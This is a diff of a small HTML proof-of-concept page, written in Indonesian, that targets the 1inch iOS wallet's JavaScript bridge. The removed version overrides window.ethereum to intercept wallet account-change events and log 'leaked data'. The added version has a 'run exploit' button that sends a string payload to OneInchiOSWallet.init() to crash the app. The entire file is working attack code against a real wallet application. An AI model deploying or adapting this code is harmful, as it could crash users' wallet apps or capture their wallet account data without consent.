@@ -1,35 +1,51 @@
 <!DOCTYPE html>
-<html>
-<body style="background: #000; color: #0f0; font-family: monospace; padding: 20px;">
-    <h3>📡 Memancing Data Dompet...</h3>
-    <p>Setelah menekan tombol di bawah, silakan masuk ke menu dompet 1inch dan <b>ganti akun</b> atau <b>ganti network</b>.</p>
-    
-    <button onclick="startMonitor()" style="padding:10px; background:#0f0; border:none; font-weight:bold;">AKTIFKAN MONITOR</button>
-    <div id="logs" style="margin-top:20px; border-top:1px solid #333;"></div>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PoC 1inch Bridge Test</title>
+    <style>
+        body { font-family: monospace; background: #000; color: #0f0; padding: 20px; text-align: center; }
+        .box { border: 1px solid #333; padding: 15px; border-radius: 8px; margin-top: 20px; }
+        button { background: #0f0; color: #000; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; border-radius: 5px; }
+        button:active { background: #0a0; }
+        #status { margin-top: 15px; color: yellow; }
+    </style>
+</head>
+<body>
+
+    <h2>🛠️ 1inch Bridge PoC</h2>
+    <p>Target: OneInchiOSWallet.init()</p>
+
+    <div class="box">
+        <button onclick="triggerCrash()">JALANKAN EXPLOIT</button>
+        <div id="status">Status: Menunggu interaksi...</div>
+    </div>
 
     <script>
-        function log(msg) {
-            document.getElementById('logs').innerHTML += `> ${msg}<br>`;
-        }
+        function triggerCrash() {
+            const statusDiv = document.getElementById('status');
+            const target = window.OneInchiOSWallet;
 
-        function startMonitor() {
-            log("Monitor diaktifkan...");
-            
-            // Kita coba mendaftarkan fungsi callback kita ke objek window
-            // Berharap dompet akan memanggilnya saat terjadi perubahan akun
-            window.ethereum = {
-                on: function(event, callback) {
-                    log("Mendeteksi pendaftaran event: " + event);
-                    if (event === 'accountsChanged') {
-                        // Jika dompet mengirim data, kita tangkap di sini
-                        alert("DATA BOCOR! Cek logs.");
-                        log("DATA: " + JSON.stringify(arguments));
-                    }
-                }
-            };
-            
-            log("Menunggu interaksi user di dompet...");
+            if (!target) {
+                statusDiv.innerText = "Error: Bridge OneInchiOSWallet tidak ditemukan!";
+                statusDiv.style.color = "red";
+                return;
+            }
+
+            try {
+                statusDiv.innerText = "Mengirim payload... Jika aplikasi tertutup, PoC Berhasil.";
+                
+                // Perintah yang menyebabkan aplikasi keluar (crash)
+                // Berdasarkan temuan sebelumnya:
+                target.init("alert('Exploit Triggered')");
+
+            } catch (e) {
+                statusDiv.innerText = "Gagal: " + e.message;
+                statusDiv.style.color = "red";
+            }
         }
     </script>
+
 </body>
 </html>
